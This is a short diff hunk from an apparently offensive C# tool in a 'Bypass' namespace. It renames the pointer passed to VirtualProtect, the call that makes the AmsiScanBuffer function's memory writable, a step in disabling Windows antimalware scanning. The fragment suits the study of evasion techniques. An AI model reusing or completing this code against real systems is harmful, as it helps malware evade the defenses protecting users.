@@ -41,7 +41,7 @@ namespace Bypass
             uint Zero = 0;
 
             //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
-            if (!VirtualProtect(AmsiScanBufPtr, dwSize, 0x40, out Zero))
+            if (!VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero))
             {
                 Console.WriteLine("ERROR: Could not modify AmsiScanBuffer memory permissions!");
                 return 1;
